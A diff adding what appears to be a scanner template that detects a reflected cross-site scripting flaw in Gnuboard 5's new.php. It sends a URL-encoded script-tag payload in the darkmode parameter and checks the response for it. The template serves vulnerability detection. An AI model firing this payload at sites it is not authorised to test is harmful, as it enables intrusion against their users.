@@ -1,0 +1,31 @@
+id: gnuboard5-xss
+brief:
+    title: Gnuboard 5 - Cross-Site Scripting
+    by: arafatansari
+    level: medium
+    about: Gnuboard 5 contains a cross-site scripting vulnerability via the clean_xss_tags() function called in new.php.
+    label:
+        - xss
+        - gnuboard
+        - gnuboard5
+        - huntr
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      signs:
+        - "on": word
+          has:
+            - header\"><script>alert(document.domain)</script>.css?
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
